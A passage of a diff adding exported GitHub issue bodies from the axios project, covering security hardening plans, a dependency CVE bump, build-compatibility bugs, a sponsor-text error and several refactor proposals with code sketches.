+- Add a Node-version support policy for undici (PR description floats \""latest, throw otherwise\"" — fine, just document it).
+- Documentation: usage example, peer-dependency install instructions, behavior when undici isn't installed.
+
+## Reference
+
+Original PR with full discussion, benchmarks, and review threads: #6915
+
+Credit the original author (@niksy) on whatever lands."
+issue_body,10880,jasonsaayman,User,2026-05-12T17:38:06Z,closed,Axios security updates and further hardening,"**PNPM move**
+
+I will start the refactor to move axios to PNPM. This will happen on both the `v1.x` and `v0.x` branches. With everything going on and related security issues, I think we have no choice but to adopt it. This will actually improve parts of our workflow, but may require some workflow changes for contributors. I will add a document to assist in the transition.
+
+**Collaboration**
+
+We will no longer run actions even for repeat collaborators. This means all actions must be run by the maintainers. This should not really impact most collaborators. This has already been implemented.
+
+**Potential freeze on outside collaboration**
+
+We may consider, as many other maintainers do, freezing outside PRs. This change may seem drastic, but it may be what is needed to help harden our protection layer. I will give this careful thought before I make a decision. If we do move in this direction, we will provide guidance before implementation.
+
+In closing, I want to thank everyone who collaborates on OSS, especially Axios. It is a sad day that we even need to consider the potential freezing of outside collaboration, but the security and ecosystem risks are becoming impossible to deny, and this may be the only way to mitigate them."
+issue_body,10870,shr968,User,2026-05-09T15:50:12Z,closed,Security: bump @babel/plugin-transform-modules-systemjs to 7.29.4,"## Summary
+A high-severity vulnerability (GHSA-fv7c-fp4j-7gwp / CVE-2026-44728)
+was published in `@babel/plugin-transform-modules-systemjs`.
+
+The current `package-lock.json` pins this package at `7.29.0` which
+is vulnerable. The fix is available in `7.29.4`.
+
+## Vulnerability Details
+
+| Field | Details |
+|---|---|
+| Advisory | [GHSA-fv7c-fp4j-7gwp](https://github.com/babel/babel/security/advisories/GHSA-fv7c-fp4j-7gwp) |
+| CVE | CVE-2026-44728 |
+| Severity | High (CVSS 8.2) |
+
+## What is the vulnerability?
+
+Using Babel to compile code that was specifically crafted by an attacker
+can cause `@babel/plugin-transform-modules-systemjs` to execute arbitrary
+code on the developer's machine during the build step.
+
+A contributor who pulls a malicious branch and runs `npm run build` to
+test it locally could have their machine silently compromised — with no
+visible signs during the build.
+
+## Impact
+
+This is a `devDependency` so end users who install Axios via npm are
+**not affected**. Only developers actively working on the Axios codebase
+are at risk.
+
+## Current vs Patched Version
+
+| | Version |
+|---|---|
+| Currently pinned (vulnerable) | `7.29.0` |
+| Patched version | `7.29.4` |
+
+## Verification
+
+After running `npm audit fix` locally:
+- `npm audit` → **0 vulnerabilities**
+- `npm run build` → successful
+- `npm run test` → **761/761 tests passing**
+- No functional changes to Axios
+
+## References
+- https://github.com/babel/babel/security/advisories/GHSA-fv7c-fp4j-7gwp
+
+I am happy to open a PR for this fix."
+issue_body,10863,sxei,User,2026-05-07T09:51:00Z,closed,【bug】v1.16.0 build failed on Node.js 14 due to unsupported modern syntax,"The latest version 1.16.0 throws an error when building in the Node 14 environment:
+
+<img width=""1802"" height=""776"" alt=""Image"" src=""https://github.com/user-attachments/assets/29b951d8-abdb-4715-a9fd-e4412bd0638e"" />
+
+The issue occurs because it uses some modern JavaScript syntax that is not compatible with Node 14:
+
+<img width=""576"" height=""241"" alt=""Image"" src=""https://github.com/user-attachments/assets/1cb78225-5c02-4970-b0b7-dd6f36517278"" />
+
+
+Would you please fix this compatibility bug?Thanks a lot for your hard work!
+
+最新版的1.16.0在node14环境下构建会报错，原因是使用了如下比较新的语法：
+
+<img width=""576"" height=""241"" alt=""Image"" src=""https://github.com/user-attachments/assets/1cb78225-5c02-4970-b0b7-dd6f36517278"" />
+
+请帮忙修复bug，谢谢。"
+issue_body,10860,carladams1299-lab,User,2026-05-06T22:57:25Z,closed,refactor(http): extract Http2Sessions into lib/helpers for direct unit tests,"<!--
+Before opening: please search existing issues to avoid duplicates, and confirm the bug reproduces on the latest axios release.
+For usage questions, please use Stack Overflow (https://stackoverflow.com/questions/tagged/axios) instead.
+-->
+
+#### Describe the issue
+
+Refactor proposal (no behavior change): extract the `Http2Sessions` class from `lib/adapters/http.js` into its own module to enable direct unit tests.
+
+The Node adapter is 1,312 lines. Most of that is essential — closures over per-request state (`req`, `isDone`, `rejected`, `connectPhaseTimer`, `abortEmitter`, `boundSockets`, etc.) — and shouldn't be split. `Http2Sessions` is the one piece that genuinely doesn't belong inline:
+
+- It's already a self-contained class at `lib/adapters/http.js:137-238`.
+- Only depends on `http2` and `util` — no axios-specific imports, no closure over per-request state.
+- The module-level `http2Sessions` singleton at `lib/adapters/http.js:240` can stay in `http.js` as a one-line import.
+- Currently has **no direct unit tests** — coverage is end-to-end through the adapter, which makes the session-pooling, timeout, and cleanup logic awkward to exercise. Extracting gives a real test seam.
+- Fits `AGENTS.md` guidance that `lib/helpers/` should hold pieces that are generic and reusable outside axios. `Http2Sessions` qualifies; nothing in it knows about axios.
+
+Proposed move: `lib/adapters/http.js:137-238` → `lib/helpers/Http2Sessions.js`.
+
+**Explicitly out of scope** (and not recommended in this issue):
+- `setProxy` — already a top-level function at `lib/adapters/http.js:268` and exported as `__setProxy` for tests; nothing to do.
+- The `data:` URI handler block at `lib/adapters/http.js:651-705` — depends on `AxiosError`, `AxiosHeaders`, `settle`, and the surrounding promise's `resolve`/`reject`. Not generic, doesn't fit `lib/helpers/`, and the path is already covered end-to-end so extraction wouldn't add test value.
+- The decompression block inside the response handler (around `lib/adapters/http.js:1007-1050`) — tightly coupled to `streams`/`res.headers`/`method`/`res.statusCode` inside the response closure; extracting forces threading multiple parameters for marginal gain.
+- The inline `enforceMaxContentLength` async generator at `lib/adapters/http.js:1059` — has two distinct shapes (async generator for `responseType === 'stream'`, event listeners for buffered) that don't collapse into a shared helper without contortion.
+
+Per `AGENTS.md`, the adapter is security-sensitive, so this proposal stays narrow on purpose: one block that moves with no parameter threading, no behavior change, and a concrete test-coverage upside.
+
+#### Example code
+
+<!-- N/A — refactor proposal, no user-visible behavior change. -->
+
+```js
+// No example — internal restructuring only. Public API and runtime behavior are unchanged.
+```
+
+#### Expected behavior
+
+After the refactor:
+- `lib/adapters/http.js` imports `Http2Sessions` from `lib/helpers/Http2Sessions.js`; the `http2Sessions` singleton stays in `http.js`.
+- New unit tests in `tests/unit/helpers/` cover session reuse, `sessionTimeout` behavior, and the `removeSession` cleanup path directly.
+- All existing tests pass unchanged: `npm run test:vitest:unit`, `npm run test:vitest:browser:headless`, smoke and module suites.
+- No change to bundle size beyond what the module split implies (Rollup inlines static imports).
+- No change to public API surface, type declarations, or error codes.
+
+#### Actual behavior
+
+`Http2Sessions` is currently inlined in `lib/adapters/http.js`, so its session-pooling and timeout/cleanup logic can only be exercised end-to-end through the adapter. There is no direct unit-test seam for the class.
+
+#### Environment
+
+- Axios version: 1.16.0 (current `v1.x`)
+- Adapter: http (Node)
+- Runtime: N/A — source-level refactor
+- OS: N/A
+- Additional context: aligns with `AGENTS.md` guidance that `lib/helpers/` should hold generic, reusable pieces; `Http2Sessions` fits that boundary.
+"
+issue_body,10855,sagodi97,User,2026-05-06T14:40:08Z,closed,"docs(readme): Buzzoid sponsor description is incorrect (shows Requestly's copy, not Buzzoid's)","On the current `main` README, the Gold sponsor entry for **Buzzoid** is described as:
+
+> A lightweight open-source API Development, Testing & Mocking platform
+
+That description does not match Buzzoid. The linked site (`https://buzzoid.com/buy-instagram-followers/`) is a service for buying Instagram followers — the URL path, the OpenCollective slug (`buzzoid-buy-instagram-followers`), and the axios project's own sponsor data all confirm this.
+
+Readers clicking through the README expecting an API development tool instead land on a social‑media engagement store, which I think is worth fixing regardless of how the sponsorship tier is decided.
+
+### Evidence that this is a text mistake, not the intended description
+
+1. `docs/data/sponsors.json` still holds the correct description for this sponsor:
+
+   ```json
+   {
+     ""name"": ""Buzzoid - Buy Instagram Followers"",
+     ""imageUrl"": ""https://images.opencollective.com/buzzoid-buy-instagram-followers/56a09fe/logo.png"",
+     ""description"": ""At Buzzoid, you can buy Instagram followers quickly, safely, and easily with just a few clicks. Rated world's #1 IG service since 2012."",
+     ""tier"": ""gold"",
+     ""slug"": ""buzzoid-buy-instagram-followers"",
+     ""website"": ""https://buzzoid.com/buy-instagram-followers/?utm_source=axios_docs_website&utm_medium=website&utm_campaign=axios_open_collective_sponsorship"",
+     ""active"": true
+   }
+   ```
+
+2. Every prior auto-generated README refresh by the `github-actions` bot rendered Buzzoid with the matching title/alt text — for example, the most recent merged one, #10668, uses `alt=""Buzzoid - Buy Instagram Followers""` and `title=""At Buzzoid, you can buy Instagram followers…""`.
+
+3. The string ""A lightweight open-source API Development, Testing & Mocking platform"" is the former **Requestly** sponsor's description. Requestly was present in earlier bot-generated sponsor layouts but no longer appears in the README; its description seems to have been left attached to the Buzzoid card when the sponsor section was manually rewritten in commit cc9aa2f487 (""docs: update sponsors"").
+
+### Steps to reproduce
+
+1. Open `README.md` on `main` (or the package page on npm).
+2. Scroll to the Gold sponsors table.
+3. Observe the Buzzoid card description vs. the `buzzoid.com` link destination.
+
+### Expected
+
+The Buzzoid card shows Buzzoid's actual description (e.g., the one already in `docs/data/sponsors.json`) and an alt text consistent with the sponsor, e.g. `Buzzoid - Buy Instagram Followers`.
+
+### Actual
+
+Buzzoid is shown as ""A lightweight open-source API Development, Testing & Mocking platform"" — which is Requestly's description, not Buzzoid's.
+
+### Suggested fix
+
+In `README.md`, update the Buzzoid block to use the name/description from `docs/data/sponsors.json`:
+
+- `alt=""Buzzoid""` → `alt=""Buzzoid - Buy Instagram Followers""`
+- Replace the paragraph `A lightweight open-source API Development, Testing & Mocking platform` with the existing canonical description (e.g., `At Buzzoid, you can buy Instagram followers quickly, safely, and easily with just a few clicks. Rated world's #1 IG service since 2012.`).
+
+If README sponsor blocks are supposed to be regenerated from `docs/data/sponsors.json` by the sponsor-update workflow, it may also be worth checking why the manual edit in cc9aa2f487 diverged from that source of truth so the next auto-update doesn't silently get out of sync again.
+
+### Context
+
+Not a duplicate of #7075 / #6758 — those were about whether Buzzoid should be listed as a sponsor at all (closed: sponsorship is accepted via OpenCollective). This issue is strictly about the description text being wrong for whichever sponsor occupies that slot.
+"
+issue_body,10851,SuperMarshtomp,User,2026-05-06T06:56:50Z,closed,Build Error: Unexpected token '??' in lib/adapters/fetch.js (Compatibility issue with Webpack 4 / Vue 2.7),"After upgrading to the latest version of Axios, the build fails in environments using Webpack 4 or older bundlers that do not support ES2020 syntax (specifically the Nullish Coalescing operator `??`).
+
+The error occurs in `lib/adapters/fetch.js` at the following line:
+```javascript
+const globalObject = utils.global ?? globalThis;
+```
+
+**Error Log**
+```text
+Module parse failed: Unexpected token (30:37)
+You may need an appropriate loader to handle this file type, currently no loaders are configured to process this file.
+| 
+| const factory = (env) => {
+>   const globalObject = utils.global ?? globalThis;
+|   const { ReadableStream, TextEncoder } = globalObject;
+```
+
+**Environment**
+*   Axios version: latest
+*   Environment: `Vue 2.7`
+*   Bundler: `Webpack 4.x`
+*   Node.js version: `v20.19.6`
+
+**To Reproduce**
+1. Create a Vue 2.7 project with Webpack 4.
+2. Install the latest version of Axios.
+3. Import Axios in any component.
+4. Run `npm run serve` or `npm run build`.
+
+**Expected behavior**
+Axios should be compatible with widely used build tools (like Webpack 4) or provide a transpiled version (ES5/ES6) in its distribution package to avoid breaking legacy-but-supported environments like Vue 2.7.
+
+**Suggested Fix / Possible Workaround**
+While users can add Axios to `transpileDependencies` in `vue.config.js`, it would be better for library compatibility if the code used more widely supported syntax, such as:
+```javascript
+const globalObject = utils.global !== undefined && utils.global !== null ? utils.global : globalThis;
+```
+Or ensure the published build targets a more compatible ES version."
+issue_body,10849,JackieCheung,User,2026-05-06T02:18:48Z,closed,V1.16.0 custom request header attributes do not support Chinese.,"Just want to encode the Chinese request header attributes in request interceptor, 
+eg: `config.headers.oprtName = encodeURIComponent(config.headers.oprtName)`,
+but now `config.headers.oprtName` is empty.
+
+It works in versions before 1.15.0.
+
+[reproduction](https://stackblitz.com/edit/3uf8e7nx?file=src%2Findex.css,src%2Fdemo.vue)
+
+<img width=""3192"" height=""1552"" alt=""Image"" src=""https://github.com/user-attachments/assets/fc9b3896-0ae8-41c6-9122-4a56bd82534a"" />
+"
+issue_body,10847,ArenSH,User,2026-05-05T13:12:23Z,closed,"Inconsistent fix version for CVE-2025-62718, CVE-2026-40175, and CVE-2026-25639","Hello,
+
+Can you please help us resolve some issues with fix versions in CVEs? We use Prisma Cloud to detect CVEs and it lists these 3 CVEs as active for `0.31.1` version of axios. I think it might be because of how ""affected"" and ""patched"" versions are specified on axios advisory pages.  
+
+## CVE-2025-62718
+
+The [NVD Page](https://nvd.nist.gov/vuln/detail/CVE-2025-62718) refers to [axios GHSA-3p68-rc4w-qgx5](https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5) and therefore shows that fixed version is >=1.15.0. However, the [github GHSA-3p68-rc4w-qgx5](https://github.com/advisories/GHSA-3p68-rc4w-qgx5) properly lists 0.x versions >=0.31.0 as patched.
+
+## CVE-2026-40175
+
+The same way, [NVD Page](https://nvd.nist.gov/vuln/detail/CVE-2026-40175) refers to [axios GHSA-fvcv-3m26-pcqx](https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx) without 0.x versions, while [github GHSA-fvcv-3m26-pcqx](https://github.com/advisories/GHSA-fvcv-3m26-pcqx) lists >= 0.31.0 as patched.
+
+## CVE-2026-25639
+
+Here the [NVD Page](https://nvd.nist.gov/vuln/detail/CVE-2026-25639) refers to [axios GHSA-43fc-jf86-j433](https://github.com/axios/axios/security/advisories/GHSA-43fc-jf86-j433), where 0.30.3 **is specified** as patched, however NVD still only lists >=1.13.5 as patched. Maybe because of how affect versions are specified (`<= 1.13.4` instead of `>= 1.0.0, <= 1.13.4`, like it is done on [github GHSA-43fc-jf86-j433](https://github.com/advisories/GHSA-43fc-jf86-j433))?
+
+---
+
+I'm not sure if it is the reason, but can you please take a look and maybe fix the affected and patched versions on axios advisory pages? Thanks"
+issue_body,10830,lohdptm,User,2026-04-30T16:01:36Z,closed,docs: fix duplicate word typo in CHANGELOG,"Hey maintainers! I was reading through the changelog while upgrading my project and noticed a small duplicate word typo. Thought I'd drop a quick patch for it. Thanks for the amazing library!
+
+```diff
+--- a/CHANGELOG.md
++++ b/CHANGELOG.md
+@@ -4341,7 +4341,7 @@ Thanks to @DigitalBrainJS and others for bringing this up!
+ - Provide a pre-configured `axios` instance #284 (Thanks @mzabriskie)
+ - Fix unhandled exception in Node.js when network goes down #260 (Thanks @mzabriskie)
+ - Provide detailed information for Network Errors #226 (Thanks @mzabriskie)
+-- Normalize headers for requests objects #282 (Thanks @mzabriskie)
++- Normalize headers for request objects #282 (Thanks @mzabriskie)
+```
+"
+issue_body,10826,jasonsaayman,User,2026-04-29T18:00:35Z,open,XHR adapter: avoid main-thread jank from synchronous document.cookie reads (use cookieStore where available),"## Background
+
+axios reads the XSRF cookie via `document.cookie` inside `lib/helpers/cookies.js`, called from `lib/helpers/resolveConfig.js`. `document.cookie` access is synchronous and main-thread-blocking; under contention it can show up as a real jank source in browser performance traces. The whatwg/html issue tracking this is [whatwg/html#11658](https://github.com/whatwg/html/issues/11658), and the [Cookie Store API](https://cookiestore.spec.whatwg.org/) is the asynchronous alternative when available.
+
+[#7040](https://github.com/axios/axios/pull/7040) (now closed) was a first pass at this. The motivation was sound but the implementation had several blockers (regressed CVE fixes through a stale base, double cookie-value encoding, non-standard-env fallback dropped, broad XHR re-indent, opt-in flag rather than auto-detection). See the close comment on that PR for the detail.
+
+## What we want
+
+A jank-avoiding read path for the XSRF cookie that:
+
+- **Is XHR-only.** The `fetch` adapter is already `async`; switching its config-resolution to cookieStore adds a microtask without saving jank. The change should be confined to where it actually helps.
+- **Is automatic, not opt-in.** No new public config option. Detect `window.cookieStore` at runtime; use it for XSRF reads when present, fall back to the existing `document.cookie` path when not.
+- **Round-trips cookie values correctly.** `cookieStore.get` returns the raw value; do not `decodeURIComponent` it. `cookieStore.set` accepts the raw value; do not `encodeURIComponent` it. Encoding is a `document.cookie`-specific quirk.
+- **Preserves existing security hardening.** The `own(key)` prototype-pollution guard from GHSA-q8qp-cvcw-x6jj and the strict `withXSRFToken === true || == null` check from GHSA-xx6v-rp6x-q39c must stay intact in any restructure of `resolveConfig.js`. Same for the `encodeUTF8` helper that replaced `unescape(encodeURIComponent(...))`.
+- **Preserves the non-standard-env no-op.** `cookies.js` returns a `{write(){}, read(){return null}, remove(){}}` shim in Web Worker / React Native envs. Any new export must keep that fallback.
+
+## Implementation notes / constraints
+
+- The XHR adapter currently does `const _config = resolveConfig(config)` synchronously inside `dispatchXhrRequest`. The smallest change is to make `dispatchXhrRequest` `async` (or do `resolveConfig(config).then(...)`) without re-indenting the entire body.
+- `resolveConfig` returning a Promise needs to be a controlled change: any other internal caller that assumes sync should be checked. Quick scan: `lib/adapters/fetch.js`, `lib/adapters/xhr.js`, possibly tests.
+- Tests should mock `window.cookieStore` explicitly to verify the async branch actually runs (existing approach asserted via `document.cookie`, which co-stores with cookieStore and didn't differentiate).
+- Behaviour in browsers without cookieStore (Safari at the time of writing being the conspicuous one) must be unchanged.
+
+## Out of scope
+
+- Any general async-resolution work beyond XSRF cookie reads.
+- Changes to the fetch adapter.
+- New public config options.
+
+## References
+
+- Closed PR: #7040
+- Cookie Store API: https://cookiestore.spec.whatwg.org/
+- whatwg/html issue: https://github.com/whatwg/html/issues/11658
+- Related security advisories that must remain intact: GHSA-q8qp-cvcw-x6jj, GHSA-xx6v-rp6x-q39c"
+issue_body,10824,AGOPIREDDY12,User,2026-04-29T14:43:22Z,closed,Vulnerability flagged in axios@1.15.2,"We see the below high severity in our scanning with the new version of axios 1.15.2
+Improper Removal of Sensitive Information Before Storage or Transfer"
+issue_body,10818,jasonsaayman,User,2026-04-28T15:16:56Z,closed,fix(http): timeout not honored during TCP connect phase when maxRedirects=0,"### Describe the bug
+
+With the http adapter and `maxRedirects: 0`, configured `timeout` values are ignored while the TCP connect phase is still pending. If the host's SYN is blackholed or the address is unroutable, the request only settles when the kernel's TCP retry gives up — roughly 5s on macOS, longer on Linux — regardless of how short `timeout` is.
+
+`maxRedirects > 0` is unaffected, because the follow-redirects transport starts its own timer at request construction.
+
+### Reproduction
+
+Tested against current v1.x HEAD:
+
+```js
+import axios from 'axios';
+
+// 192.0.2.1 is TEST-NET-1 (RFC 5737); kernel drops the SYN.
+const url = 'http://192.0.2.1/';
+
+async function attempt(label, config) {
+  const t0 = Date.now();
+  try { await axios.get(url, config); }
+  catch (err) {
+    console.log(`[${label}] ${Date.now() - t0}ms code=${err.code}`);
+  }
+}
+
+await attempt('maxRedirects=0, timeout=500',  { maxRedirects: 0, timeout: 500 });
+await attempt('maxRedirects=0, timeout=2000', { maxRedirects: 0, timeout: 2000 });
+await attempt('maxRedirects=5, timeout=500',  { maxRedirects: 5, timeout: 500 });
+```
+
+Output (Node 24, macOS):
+
+```
+[maxRedirects=0, timeout=500]  5006ms code=ECONNABORTED
+[maxRedirects=0, timeout=2000] 5002ms code=ECONNABORTED
+[maxRedirects=5, timeout=500]   506ms code=ECONNABORTED
+```
+
+### Expected
+
+The configured timeout should fire during the connect phase too, not only after the socket is established.
+
+### Root cause
+
+`ClientRequest.setTimeout(ms, cb)` from Node's native http module arms a socket-inactivity timer. That timer doesn't tick until the socket is bound and connected. If connect never completes, the timer never starts and the reject is driven by whatever connect error the kernel surfaces.
+
+follow-redirects runs its own wall-clock timer that starts at request construction, which is why `maxRedirects > 0` honors the configured value immediately.
+
+### Suggested fix
+
+For the `maxRedirects === 0` path in `lib/adapters/http.js`, attach a wall-clock `setTimeout(config.timeout)` from the moment the request is created, fire the existing timeout error when it elapses, and clear it on `close` / `response` / successful settle. The existing message and code resolution can be reused so `timeoutErrorMessage` and `transitional.clarifyTimeoutError` keep working.
+
+### Related
+
+- Clarified scope of #6801
+- PR #10657 attempted a broader fix that didn't address the connect-phase root cause
+- Relevant locations: `lib/adapters/http.js:740` (transport selection), `lib/adapters/http.js:1023` (current `req.setTimeout` handler)
+
+### Axios version
+
+v1.x HEAD (verified at 25387ae)
+
+### Adapter
+
+http"
+issue_body,10817,jasonsaayman,User,2026-04-28T14:36:13Z,closed,Tighten parseReviver context type to reflect ES2023 spec (source is only present for primitives),"## Background
+
+PR #10782 added the ES2023 `context` argument to the `parseReviver` type:
+
+```ts
+// index.d.ts:441 / index.d.cts:544
+parseReviver?: (this: any, key: string, value: any, context?: { source: string }) => any;
+```
+
+This is correct as far as it goes, but it's slightly looser than the spec.
+
+## The gap
+
+Per the TC39 [proposal-json-parse-with-source](https://github.com/tc39/proposal-json-parse-with-source), `context.source` is only set when the reviver is invoked on a **primitive** value (string, number, boolean, null). When the reviver is invoked on an object or array, `source` is absent from the context object.
+
+The current typing says ""if `context` is provided, `source` is always a string."" That's true for primitives but not for object/array reviver invocations. A user can legally write:
+
+```ts
+parseReviver: (key, value, context) => {
+  if (typeof value === 'object') {
+    return context.source.length; // ← types say string, runtime undefined → crash
+  }
+}
+```
+
+## Proposed fix
+
+Mark `source` as optional:
+
+```ts
+parseReviver?: (this: any, key: string, value: any, context?: { source?: string }) => any;
+```
+
+Apply to both `index.d.ts` and `index.d.cts`.
+
+## Acceptance criteria
+
+- [ ] Update `parseReviver` signature in `index.d.ts` and `index.d.cts` to `context?: { source?: string }`
+- [ ] Add a `tsd` (or equivalent dtslint) test asserting:
+  - The 4th argument is optional
+  - `context.source` is typed as `string | undefined`, not `string`
+  - The 3-arg form (no context) still type-checks for backward compatibility
+- [ ] Update the docs example in `docs/pages/advanced/request-config.md` if it relies on the looser typing (the existing examples already use `context?.source` which works either way)
+
+## Context
+
+- Spec: https://github.com/tc39/proposal-json-parse-with-source
+- Original PR: #10782
+- Affected files: `index.d.ts`, `index.d.cts`
+- Runtime: no change — `lib/defaults/index.js:129` forwards directly to native `JSON.parse`
+
+Patch-level change; types only."
+issue_body,10815,jasonsaayman,User,2026-04-28T13:51:33Z,closed,Modernize composeSignals with AbortSignal.any while preserving reason normalization,"## Background
+
+`lib/helpers/composeSignals.js` currently composes multiple `AbortSignal`s and an optional timeout using manually-attached `addEventListener('abort', ...)` listeners. Modern runtimes (Node 19+, current browsers) provide `AbortSignal.any(...)` natively, which would let us drop the manual aggregation.
+
+A previous attempt to do this (#7380) regressed behavior, so it was closed in favor of this issue.
+
+## The constraint to preserve
+
+Today, every reason that lands on the composed signal is normalized:
+
+```js
+const err = reason instanceof Error ? reason : this.reason;
+controller.abort(
+  err instanceof AxiosError
+    ? err
+    : new CanceledError(err instanceof Error ? err.message : err)
+);
+```
+
+So `composedSignal.reason` is always an `AxiosError` (since `CanceledError` extends `AxiosError`).
+
+The fetch adapter relies on this invariant at `lib/adapters/fetch.js:415` to recover from Safari's broken DOMException-like aborts:
+
+```js
+if (composedSignal && composedSignal.aborted && composedSignal.reason instanceof AxiosError) {
+  const canceledError = composedSignal.reason;
+  // ...
+  throw canceledError;
+}
+```
+
+A naive switch to `AbortSignal.any` propagates the source signal's reason as-is, breaking this for any user that calls `controller.abort()` with no reason or with a plain `Error`.
+
+## What needs to happen
+
+Use `AbortSignal.any` internally as the aggregator, but expose an outer signal whose reason is always an `AxiosError`/`CanceledError`. Approximate shape:
+
+```js
+if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.any === 'function') {
+  const outer = new AbortController();
+  let timer;
+  const clearTimer = () => { timer && clearTimeout(timer); timer = null; };
+
+  const sources = [...signals];
+  if (timeout) {
+    const timeoutCtrl = new AbortController();
+    timer = setTimeout(() => {
+      timeoutCtrl.abort(new AxiosError(`timeout of ${timeout}ms exceeded`, AxiosError.ETIMEDOUT));
+    }, timeout);
+    sources.push(timeoutCtrl.signal);
+  }
+
+  const inner = AbortSignal.any(sources);
+  inner.addEventListener('abort', () => {
+    if (outer.signal.aborted) return;
+    const r = inner.reason;
+    outer.abort(
+      r instanceof AxiosError
+        ? r
+        : new CanceledError(r instanceof Error ? r.message : r)
+    );
+  });
+
+  outer.signal.unsubscribe = () => utils.asap(clearTimer);
+  return outer.signal;
+}
+
+// existing fallback below
+```
+
+Keep the existing implementation as the fallback for runtimes without `AbortSignal.any`.
+
+## Acceptance criteria
+
+- [ ] Fast path uses `AbortSignal.any` when available
+- [ ] Fallback remains for runtimes without it
+- [ ] `composedSignal.reason instanceof AxiosError` holds in every abort scenario, including:
+  - timeout fires
+  - `controller.abort()` with no reason
+  - `controller.abort(new Error('x'))`
+  - `controller.abort('string reason')`
+  - `controller.abort(new AxiosError(...))`
+  - cancelToken-derived signal
+- [ ] `composedSignal.unsubscribe` is exposed and clears the timeout timer
+- [ ] Regression test in `tests/unit/composeSignals.test.js` covering the four `controller.abort(...)` shapes above, asserting `signal.reason instanceof AxiosError`
+- [ ] Fetch-adapter integration test confirming the Safari catch-block path (`fetch.js:415`) still triggers under user-initiated cancellation
+
+## Context
+
+- Original PR: #7380
+- Safari catch-block origin: #10806
+- Affected file: `lib/helpers/composeSignals.js`
+- Caller relying on the invariant: `lib/adapters/fetch.js`"
+issue_body,10809,jasonsaayman,User,2026-04-27T14:29:45Z,closed,Docs: document paramsSerializer.encode for strict RFC 3986 query encoding,"### Summary
+
+`encode()` in `lib/helpers/buildURL.js` deliberately decodes `%3A`, `%24`, `%2C` and `%20` back to `:`, `$`, `,` and `+` for readability. Those characters are valid in a query component under RFC 3986, so the output is correct, but some backends require strict percent-encoding and reject the readable form.
+
+axios already supports this case via `paramsSerializer.encode`, but it isn't documented with a strict-encoding example. Users hitting this run into it as a surprise (see the recurring stream of issues and PRs around `%3A`, e.g. #7290), and the workaround they often reach for is a one-off patch to `encode()` rather than the supported escape hatch.
+
+### What to add to the docs
+
+A short subsection under `paramsSerializer` showing the strict-encoding case:
+
+```js
+// Per-request: emit RFC 3986 strict percent-encoding for query values
+axios.get('/foo', {
+  params: { filter: JSON.stringify({ startedAt: '2025-01-23' }) },
+  paramsSerializer: { encode: encodeURIComponent }
+});
+
+// Or set it on the instance defaults
+const client = axios.create({
+  paramsSerializer: { encode: encodeURIComponent }
+});
+```
+
+Plus a one-line note explaining *why* the default decodes `:`, `$`, `,`, `+`: those characters are valid in the query component per RFC 3986, axios prefers the readable form, but stricter servers may require full encoding via the option above.
+
+### Where
+
+`README.md` `paramsSerializer` section, and the same section in `docs/` if it lives there separately.
+
+### Related
+
+- #7290 (closed) — proposed an in-encoder JSON-shape heuristic; the right answer is the existing `paramsSerializer.encode` hook.
+"
+issue_body,10808,jasonsaayman,User,2026-04-27T14:24:23Z,closed,Fix fromDataURI regex to match RFC 2397 (no runtime dep),"### Summary
+
+`lib/helpers/fromDataURI.js` uses a `DATA_URL_PATTERN` regex that doesn't match RFC 2397, so several valid data URIs throw `Invalid URL`. We should fix this inline rather than pulling in a runtime dependency.
+
+### Failing cases
+
+All three of these are RFC 2397 compliant and currently rejected:
+
+- `data:;base64,MTIz` — no media type
+- `data:application/octet-stream,123` — no parameters before the comma
+- `data:text/plain;charset=US-ASCII,123` — non-base64 parameter
+
+The current regex requires `[^;]+;` for the first segment, so any URI without a `;` before the body fails to match.
+
+### Why inline rather than a dependency
+
+PR #7295 proposed swapping in `data-uri-to-buffer`. The tradeoffs there: v6+ is ESM-only and bumps `engines.node` to >=14, so we'd need to pin v3, which is unmaintained. For a fix of this size, a runtime dep isn't worth the supply-chain surface.
+
+### Proposed regex
+
+RFC 2397 grammar: `""data:"" [ mediatype ] [ "";base64"" ] "","" data` where `mediatype := [ type ""/"" subtype ] *( "";"" parameter )`.
+
+A compliant inline pattern in `lib/helpers/fromDataURI.js`:
+
+```js
+const DATA_URL_PATTERN = /^([^,;]+\/[^,;]+)?((?:;[^,;=]+=[^,;]+)*)(;base64)?,([\s\S]*)$/;
+```
+
+Then in `fromDataURI`:
+
+- group 1: media type (may be empty)
+- group 2: parameter list (e.g. `;charset=US-ASCII`)
+- group 3: `;base64` marker (truthy when present)
+- group 4: body
+
+For the Blob path, the type passed to `new Blob` should be `mediaType + parameters` so charset survives.
+
+### Test coverage to add
+
+Port the test cases from #7295 into `tests/unit/helpers/fromDataURI.test.js` (vitest, not the legacy mocha file). The matrix worth keeping:
+
+- Base64 and non-base64 body, both with and without media type
+- Charset parameter present, both base64 and non-base64
+- URL-encoded body values get decoded
+- Blob output preserves the full content type including parameters
+- `datax:,hi` throws `Unsupported protocol`
+- `data:hi` throws `Invalid URL`
+
+### Related
+
+- #7295 — closed in favour of this maintainer-led approach
+"
+issue_body,10807,jasonsaayman,User,2026-04-27T14:18:44Z,closed,Rewrite toJSONObject cycle detection with WeakSet (preserve path semantics),"### Summary
+
+`utils.toJSONObject` currently uses a path-based stack for cycle detection (`lib/utils.js:753-786`). That works, but it's `O(n)` per check via `Array.indexOf` and the cleanup-on-ascent logic is easy to get wrong (see #7230, which dropped the cleanup and silently broke DAG handling).
+
+We should rewrite this to use a `WeakSet` while preserving path semantics — `add` on descent, `delete` on ascent — and add coverage for the shared-sibling case so future refactors can't regress it.
+
+### Why path semantics matter
+
+The current implementation only treats an object as ""seen"" if it's an ancestor on the current recursion path. This is deliberate: shared sibling references (a non-cyclic DAG) need to be serialized at every occurrence, not deduplicated.
+
+```js
+const shared = { a: 1 };
+toJSONObject({ x: shared, y: shared });
+// expected: { x: { a: 1 }, y: { a: 1 } }
+```
+
+A naive `WeakSet` swap that omits `delete` on ascent turns the second occurrence into `undefined`, which the caller then drops entirely. That's the regression #7230 introduced.
+
+### Proposed change
+
+In `lib/utils.js`:
+
+```js
+const toJSONObject = (obj) => {
+  const visited = new WeakSet();
+
+  const visit = (source) => {
+    if (isObject(source)) {
+      if (visited.has(source)) return;
+      if (isBuffer(source)) return source;
+
+      if (!('toJSON' in source)) {
+        visited.add(source);
+        const target = isArray(source) ? [] : {};
+        forEach(source, (value, key) => {
+          const reducedValue = visit(value);
+          !isUndefined(reducedValue) && (target[key] = reducedValue);
